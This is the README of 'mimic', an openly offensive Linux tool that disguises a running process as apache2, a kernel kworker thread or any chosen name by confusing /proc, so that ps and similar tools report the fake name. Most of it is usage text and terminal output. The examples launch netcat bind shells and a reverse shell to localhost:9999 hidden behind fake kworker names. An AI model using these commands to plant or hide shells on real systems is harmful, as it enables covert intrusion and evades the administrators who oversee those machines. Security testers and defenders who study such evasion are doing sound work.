# mimic

_mimic_ is a tool for covert execution on Linux x86\_64.

**What is "covert execution"?**

Covert execution is the art of hiding a process. In this case, _mimic_ hides the process in plain sight. Any user can use it. It does not require special permissions. It does not require special binaries. It does not require a root kit.

**What?! No special privileges??**

That is correct. _mimic_ works by rearranging the internal structures of a process in such a way that it confuses the /proc entry for that process. All tools that report the nature of a process do so by examining /proc. If we can bend /proc, then we can hide a process in plain sight. Since we are only altering the state of a process we own, anyone can successfully run _mimic_.

**Can this be detected?!**

Of course, but only if you are looking very closely, or running a forensic tool that is looking for this sort of thing. The usefulness behind _mimic_ is that it will prevent someone from becoming suspicious in the first place.

**Who is the target audience for _mimic_?**

Anyone who legitimately needs covert execution before they have gotten root. This includes, but is not limited to:
 * Pentesters.
 * Investigators performing covert operations (with the prior approval of their Legal and HR departments, of course.)

**Why is it called "_mimic_"?**

Because "Liar, liar, /proc on fire!" was too long.

**What is "set_target_pid"?**

set_target_pid is a small helper program in the mimic suite that will exhaust pids until the one you want comes back around. This allows you to choose where in the process listing you want your process to sit. Note that the kernel reserves the first 300 pids for kernel threads. If you try to go below that, you'll probably end up running with pid 301.


## Usage ##

	usage: mimic -e COMMAND [-m MIMIC] [-b] [-a KEY=VALUE] [-q] [-h]
		-e	Execute COMMAND.
		-m	Setup COMMAND to look like MIMIC.
				Default for non-root is:    "/usr/sbin/apache2 -k start"
				Default for root is:        "[kworker/0:0]"
		-b	Launch COMMAND in the background.
		-a	Add / overwrite KEY to the mimic environment with associated VALUE.
		-q	Be quiet! Do not print normal output.
		-h	Print this helpful message.
	
		Notes:
			The MIMIC environment will be a copy of the COMMAND environment.
			The '_' variable is automatically changed.
			The -a flag can be called multiple times to add / overwrite multiple variables.
	
		Examples:
			mimic -e /bin/bash
			set_target_pid 1 && mimic -e /bin/bash
			mimic -b -e "./revsh"
			mimic -b -e "nc -l -e /bin/bash"
			mimic -b -e "nc -l -e \"mimic -e /bin/bash\""


## Examples ##

First example - Launching a netcat listener as a regular user:

	empty@monkey:~$ ./mimic -b -e "/usr/local/bin/ncat -l -e \"./mimic -e /bin/bash\""
	Launching child...                  Success!
	Waiting for child to attach...      Success!
	Initializing ptrace_do...           Success!
	Determining stack state...          Success!
	Politely requesting name change...  Success!
	Searching for main()...             Success!
	Building execution headers...       Success!
	Setting up final state...           Success!
	
		Good-bye and have a good luck! :)
	
	empty@monkey:~$ ps aux | grep apache
	empty     1931 19.5  0.0  16648  1324 pts/1    S    21:41   0:02 /usr/sbin/apache2 -k start
	empty     1935  0.0  0.0   7596   836 pts/1    S+   21:41   0:00 grep apache
	
	empty@monkey:~$ sudo lsof -i -n -P | grep apache
	[sudo] password for empty: 
	apache2  1931 empty    3u  IPv6  14462      0t0  TCP *:31337 (LISTEN)
	apache2  1931 empty    4u  IPv4  14463      0t0  TCP *:31337 (LISTEN)

Second example - Launching a netcat reverse shell as root:

	root@monkey:~$ /home/empty/code/mimic/set_target_pid 1 && /home/empty/code/mimic/mimic -b -q -e "/usr/local/bin/ncat -e \"/home/empty/code/mimic/mimic -e \\\"/bin/bash\\\"\" localhost 9999"
	
Can you spot the fake kworkers? Would you be able to without the help of grep?

	root@monkey:~$ ps aux | grep kworker | grep -v grep
	root        18  0.0  0.0      0     0 ?        S    19:39   0:00 [kworker/3:0]
	root       197  0.0  0.0      0     0 ?        S    19:39   0:06 [kworker/u:3]
	root       198  0.0  0.0      0     0 ?        S    19:39   0:06 [kworker/u:4]
	root       199  0.0  0.0      0     0 ?        S    19:39   0:06 [kworker/u:5]
	root       302 23.4  0.0  18748  1912 pts/5    S    22:28   0:02 [kworker/0:0]
	root       304 11.4  0.0   3780   296 pts/5    S    22:28   0:00 [kworker/0:0]              
	root       305 10.8  0.0  10644  1200 pts/5    S    22:28   0:00 [kworker/0:0]
	root       426  0.0  0.0      0     0 ?        S    20:20   0:00 [kworker/1:0]
	root       434  0.0  0.0      0     0 ?        S    20:20   0:00 [kworker/3:2]
	root       536  0.0  0.0      0     0 ?        S    20:12   0:00 [kworker/0:0]
	root       879  0.0  0.0      0     0 ?        S    20:39   0:00 [kworker/2:0]
	root      1463  0.0  0.0      0     0 ?        S    19:39   0:00 [kworker/1:2]
	root      2132  0.0  0.0      0     0 ?        S    19:47   0:00 [kworker/2:2]
	root      2607  0.0  0.0      0     0 ?        S    20:01   0:01 [kworker/0:1]
	
 Of course, no kworker should have an open socket, but I'm sure you can be more creative with your naming choices than this. :)

	root@monkey:~$ lsof -i -n -P | grep kworker
	kworker/0  302  root    4u  IPv4  20546      0t0  TCP 127.0.0.1:47054->127.0.0.1:9999 (ESTABLISHED)
	kworker/0  304  root    4u  IPv4  20546      0t0  TCP 127.0.0.1:47054->127.0.0.1:9999 (ESTABLISHED)
	kworker/0  305  root    4u  IPv4  20546      0t0  TCP 127.0.0.1:47054->127.0.0.1:9999 (ESTABLISHED)

Note that I'm running here as root only because a kworker thread should be *very* suspicious running as a non-root user. The new mimic name is just a string. It doesn't have to be an existing process. Hell, it doesn't even have to be a real thing!

	empty@monkey:~$ code/mimic/mimic -q -e /bin/bash -m "Totally not a rootkit\!"
	
	empty@monkey:~$ ps aux | grep rootkit | grep -v grep
	empty      399  2.9  0.0   3780   300 pts/4    S    22:34   0:00 Totally not a rootkit!          
	empty      400  2.7  0.0  19372  2044 pts/4    S    22:34   0:00 Totally not a rootkit!


## Installation ##

	git clone https://github.com/emptymonkey/ptrace_do.git
	cd ptrace_do
	make
	cd ..
	
	git clone https://github.com/emptymonkey/mimic.git
	cd mimic
	make


## A Quick Note on Ethics ##

I write and release these tools with the intention of educating the larger [IT](http://en.wikipedia.org/wiki/Information_technology) community and empowering legitimate pentesters. If I can write these tools in my spare time, then rest assured that the dedicated malicious actors have already developed versions of their own.

